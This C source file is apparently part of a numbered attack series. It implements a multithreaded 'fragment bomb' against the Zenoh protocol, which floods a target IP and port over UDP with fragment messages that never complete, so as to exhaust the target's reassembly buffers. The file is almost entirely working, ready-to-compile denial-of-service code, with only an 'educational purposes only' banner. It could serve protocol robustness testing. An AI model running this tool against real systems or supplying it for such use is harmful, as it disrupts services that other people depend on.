/*
 * Attack 3: Fragment Bomb
 * Sends incomplete fragments to exhaust reassembly buffers
 * 
 * Compile: gcc -o attack3_fragbomb attack_3_fragment_bomb.c -pthread
 * Run: ./attack3_fragbomb <target_ip> <target_port> <threads>
 * 
 * WARNING: FOR EDUCATIONAL PURPOSES ONLY
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <pthread.h>
#include <arpa/inet.h>
#include <sys/socket.h>
#include <signal.h>
#include <time.h>
#include <stdatomic.h>

#define Z_MSG_FRAGMENT 0x01
#define Z_FLAG_MORE 0x40
#define Z_FLAG_RELIABLE 0x20

static volatile int g_running = 1;
static atomic_ullong g_fragments_sent = 0;

typedef struct {
    char *target_ip;
    int target_port;
    int thread_id;
} thread_args_t;

void signal_handler(int sig) {
    printf("\n[!] Stopping fragment bomb...\n");
    g_running = 0;
}

size_t encode_zint(unsigned char *buf, unsigned long long value) {
    size_t i = 0;
    while (value > 0x7F) {
        buf[i++] = (unsigned char)((value & 0x7F) | 0x80);
        value >>= 7;
    }
    buf[i++] = (unsigned char)(value & 0x7F);
    return i;
}

size_t craft_fragment(unsigned char *buffer, unsigned long long seq, int variant) {
    size_t offset = 0;
    
    buffer[offset++] = Z_MSG_FRAGMENT | Z_FLAG_MORE | Z_FLAG_RELIABLE;
    offset += encode_zint(buffer + offset, seq);
    
    size_t frag_size;
    switch (variant % 3) {
        case 0: frag_size = 512; break;
        case 1: frag_size = 1024; break;
        case 2: frag_size = 2048; break;
    }
    
    for (size_t i = 0; i < frag_size && offset < 4096; i++) {
        buffer[offset++] = (seq + i) % 256;
    }
    
    return offset;
}

void* attack_thread(void *arg) {
    thread_args_t *args = (thread_args_t*)arg;
    int sock;
    struct sockaddr_in target_addr;
    unsigned char buffer[4096];
    unsigned long long seq = args->thread_id * 1000000ULL;
    
    sock = socket(AF_INET, SOCK_DGRAM, 0);
    if (sock < 0) {
        fprintf(stderr, "[-] Thread %d: Socket failed\n", args->thread_id);
        free(args);
        return NULL;
    }
    
    memset(&target_addr, 0, sizeof(target_addr));
    target_addr.sin_family = AF_INET;
    target_addr.sin_port = htons(args->target_port);
    inet_pton(AF_INET, args->target_ip, &target_addr.sin_addr);
    
    printf("[+] Thread %d started (base seq=%llu)\n", args->thread_id, seq);
    
    unsigned long local_count = 0;
    int variant = 0;
    
    while (g_running) {
        for (int i = 0; i < 50; i++) {
            size_t msg_len = craft_fragment(buffer, seq++, variant++);
            
            ssize_t sent = sendto(sock, buffer, msg_len, 0,
                                 (struct sockaddr*)&target_addr,
                                 sizeof(target_addr));
            if (sent > 0) {
                atomic_fetch_add(&g_fragments_sent, 1);
                local_count++;
            }
        }
        
        if (local_count % 5000 == 0) {
            printf("[Thread %d] Sent %lu fragments (seq=%llu)\n",
                   args->thread_id, local_count, seq);
        }
        
        usleep(10000);
    }
    
    close(sock);
    printf("[*] Thread %d stopped (sent %lu fragments)\n", 
           args->thread_id, local_count);
    free(args);
    return NULL;
}

int main(int argc, char *argv[]) {
    if (argc != 4) {
        fprintf(stderr, "Usage: %s <target_ip> <target_port> <threads>\n", argv[0]);
        return 1;
    }
    
    char *target_ip = argv[1];
    int target_port = atoi(argv[2]);
    int num_threads = atoi(argv[3]);
    
    printf("╔════════════════════════════════════════════╗\n");
    printf("║   Zenoh Fragment Bomb Attack               ║\n");
    printf("║   WARNING: EDUCATIONAL PURPOSES ONLY       ║\n");
    printf("╚════════════════════════════════════════════╝\n\n");
    printf("[*] Target: %s:%d\n", target_ip, target_port);
    printf("[*] Threads: %d\n", num_threads);
    printf("[*] Fragment variants: 3 sizes (512/1024/2048 bytes)\n");
    printf("[*] Attack: Incomplete fragments (never complete)\n\n");
    
    signal(SIGINT, signal_handler);
    srand(time(NULL));
    
    pthread_t threads[num_threads];
    time_t start = time(NULL);
    
    for (int i = 0; i < num_threads; i++) {
        thread_args_t *args = malloc(sizeof(thread_args_t));
        args->target_ip = target_ip;
        args->target_port = target_port;
        args->thread_id = i;
        pthread_create(&threads[i], NULL, attack_thread, args);
    }
    
    printf("[+] Fragment bomb started!\n\n");
    
    while (g_running) {
        sleep(5);
        unsigned long long total = atomic_load(&g_fragments_sent);
        time_t elapsed = time(NULL) - start;
        printf("[*] Fragments: %llu | Rate: %.2f fps\n",
               total, elapsed > 0 ? (double)total / elapsed : 0.0);
    }
    
    for (int i = 0; i < num_threads; i++) {
        pthread_join(threads[i], NULL);
    }
    
    unsigned long long total = atomic_load(&g_fragments_sent);
    time_t duration = time(NULL) - start;
    
    printf("\n╔════════════════════════════════════════════╗\n");
    printf("║          Final Statistics                  ║\n");
    printf("╠════════════════════════════════════════════╣\n");
    printf("║ Total Fragments: %-25llu ║\n", total);
    printf("║ Duration:        %-25ld ║\n", duration);
    if (duration > 0) {
        printf("║ Avg Rate:        %-21.2f fps ║\n", (double)total / duration);
    }
    printf("╚════════════════════════════════════════════╝\n");
    
    return 0;
}